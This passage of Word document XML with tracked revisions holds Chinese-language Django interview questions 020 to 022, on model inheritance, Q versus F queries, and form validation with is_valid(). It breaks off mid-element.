          <w:del w:id="131" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="132" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delInstrText xml:space="preserve"> HYPERLINK "https://www.cnblogs.com/wenyule/p/9740926.html" \l "_labelTop" </w:delInstrText>
        </w:r>
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="F68A33"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText>反回顶部</w:delText>
        </w:r>
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:bookmarkStart w:id="133" w:name="_label2-18"/>
        <w:bookmarkEnd w:id="133"/>
      </w:del>
    </w:p>
    <w:p w14:paraId="5B6F7F35" w14:textId="4BC17B82" w:rsidR="00717181" w:rsidRDefault="00B73D4C">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="134" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>020</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的继承有几种形式，分别是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6FEB9E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="135" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>1.通常，你只是想用父 model 来保存那些你不想在子 model 中重复录入的信息。父类是不使用的也就是不生成单独的数据表，这种情况下使用抽象基类继承 Abstract base classes。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AF04A8" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="136" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidRPr="00D2274A" w:rsidDel="00717181">
          <w:rPr>
            <w:color w:val="008000"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4C528F53" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="137" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>2.如果你想从现有的Model继承并让每个Model都有自己的数据表，那么使用多重表继承Multi-table inheritance。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16514B61" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="138" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidRPr="00D2274A" w:rsidDel="00717181">
          <w:rPr>
            <w:color w:val="008000"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="47C5951D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="139" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>3.最后，如果你只想在 model 中修改 Python-level 级的行为，而不涉及字段改变。 代理 model (Proxy models) 适用于这种场合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6400037E" w14:textId="0F4CB81D" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="140" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6F92D2E9" w14:textId="2BD1D14F" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:del w:id="141" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="142" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delInstrText xml:space="preserve"> HYPERLINK "https://www.cnblogs.com/wenyule/p/9740926.html" \l "_labelTop" </w:delInstrText>
        </w:r>
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="F68A33"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText>反回顶部</w:delText>
        </w:r>
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:bookmarkStart w:id="143" w:name="_label2-19"/>
        <w:bookmarkEnd w:id="143"/>
      </w:del>
    </w:p>
    <w:p w14:paraId="6EB23931" w14:textId="0FEBD878" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00D2274A">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:del w:id="144" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="145" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>021</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中查询</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>时什么情况下用</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4648F314" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:pPrChange w:id="146" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="147" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidDel="00717181">
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="77A21DDB" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#F:对数据本身的不同字段进行操作 如:比较和更新，对数据进行加减操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2160415D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="148" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#Q：用于构造复杂的查询条件 如：&amp; |操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBC8E0C" w14:textId="7D1E7C1F" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58A224AB" w14:textId="743E7CE8" w:rsidR="00717181" w:rsidRPr="00717181" w:rsidDel="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:del w:id="149" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rPrChange w:id="150" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
            <w:rPr>
              <w:del w:id="151" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z"/>
              <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
              <w:color w:val="333333"/>
              <w:szCs w:val="21"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="152" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:jc w:val="right"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="153" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="154" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="155" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delInstrText xml:space="preserve"> HYPERLINK "https://www.cnblogs.com/wenyule/p/9740926.html" \l "_labelTop" </w:delInstrText>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="156" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="157" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rStyle w:val="ab"/>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
                <w:color w:val="F68A33"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>反回顶部</w:delText>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="158" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:bookmarkStart w:id="159" w:name="_label2-20"/>
        <w:bookmarkEnd w:id="159"/>
      </w:del>
    </w:p>
    <w:p w14:paraId="5F65AACE" w14:textId="16C41896" w:rsidR="00717181" w:rsidRDefault="00B73D4C">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="160" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>022</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中想验证表单提交是否格式正确需要用到</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中的哪个函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A56963F" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="161" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  form.is_valid() :返回布尔值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0997CF79" w14:textId="58D1A11B" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="162" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1FFF1399" w14:textId="66F37384" w:rsidR="00717181" w:rsidRPr="00717181" w:rsidDel="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:del w:id="163" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rPrChange w:id="164" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
            <w:rPr>
              <w:del w:id="165" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z"/>
              <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
              <w:color w:val="333333"/>
              <w:szCs w:val="21"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="166" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:jc w:val="right"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="167" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="168" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="169" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delInstrText xml:space="preserve"> HYPERLINK "https://www.cnblogs.com/wenyule/p/9740926.html" \l "_labelTop" </w:delInstrText>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="170" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="171" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rStyle w:val="ab"/>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
                <w:color w:val="F68A33"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>反回顶部</w:delText>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="172" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
